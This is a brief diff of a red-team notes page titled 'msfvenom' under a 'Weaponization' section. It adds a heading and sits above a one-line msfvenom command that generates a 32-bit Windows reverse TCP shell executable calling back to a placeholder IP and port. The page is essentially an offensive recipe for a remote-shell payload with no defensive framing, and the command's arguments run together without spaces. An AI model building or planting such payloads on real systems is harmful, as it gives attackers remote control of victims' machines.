@@ -1,3 +1,9 @@
+---
+title: msfvenom
+parent: Weaponization
+grand_parent: Red Team
+---
+# Create Reverse Shell
 # exe(32)
 ```zsh
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP>LPORT=<PORT>-f exe >shell-x86.exe
